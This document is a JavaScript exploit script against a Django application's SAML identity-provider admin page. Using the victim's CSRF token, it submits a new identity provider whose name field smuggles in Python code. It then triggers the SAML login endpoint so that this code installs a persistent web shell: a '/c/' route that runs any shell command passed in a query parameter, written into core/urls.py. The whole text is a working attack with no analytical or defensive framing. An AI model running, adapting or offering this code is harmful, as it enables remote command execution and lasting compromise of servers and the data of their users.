(function() {
    function getCookie(n){let b=document.cookie.match('(^|;)\\s*'+n+'\\s*=\\s*([^;]+)');return b?b.pop():''}
    const id = Math.floor(Math.random() * 99);
    const slug = 'web-' + id;

    // The Payload (Highly Optimized):
    // Use exec with a raw string (r'...') to avoid nested escape hell
    // We clear the cache to make the change effective immediately in memory
    // const py = "import os,core.urls as u;from django.urls import*;s=r'urlpatterns.insert(0,re_path(\"^c/?$\",lambda r:os.popen(r.GET.get(\"c\")).read()))';exec(s,u.__dict__);clear_url_caches();open('core/urls.py','a').write('\\n'+s)";
     const py = "import core.urls as u;from django.urls import clear_url_caches as c;s='from django.urls import re_path;import os;urlpatterns.insert(0,re_path(\"^c/?$\",lambda r:os.popen(r.GET.get(\"c\")).read()))';exec(s,u.__dict__);c();open('core/urls.py','a').write('\\n'+s)";
    const name = `E${id}\n${py}`;

    const formData = new FormData();
    formData.append('csrfmiddlewaretoken', getCookie('csrftoken'));
    formData.append('name', name);
    formData.append('slug', slug);
    formData.append('protocol', 'saml');
    formData.append('status', 'active');
    formData.append('priority', '0'); // CRITICAL: Re-added this
    formData.append('use_custom_attribute_map', 'on');
    formData.append('attribute_mapping', '{"email":["mail"]}');
    formData.append('saml_metadata_xml', `<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://${id}.com"><md:IDPSSODescriptor
protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
Location="https://x.com"/></md:IDPSSODescriptor></md:EntityDescriptor>`);
    formData.append('_save', 'Save');

    console.log("Creating Identity Provider...");
    fetch('/admin/uac/identityprovider/add/', { method: 'POST', body: formData })
    .then(r => {
        if (r.ok) {
            console.log("IDP Created. Triggering Memory Patch...");
            return fetch('/saml2/login/' + slug + '/');
        } else {
            console.error("Creation failed. Check if field limits or CSRF are an issue.");
        }
    })
    .then(() => {
        console.log("Done. Try: /c/?c=id");
    });
})();

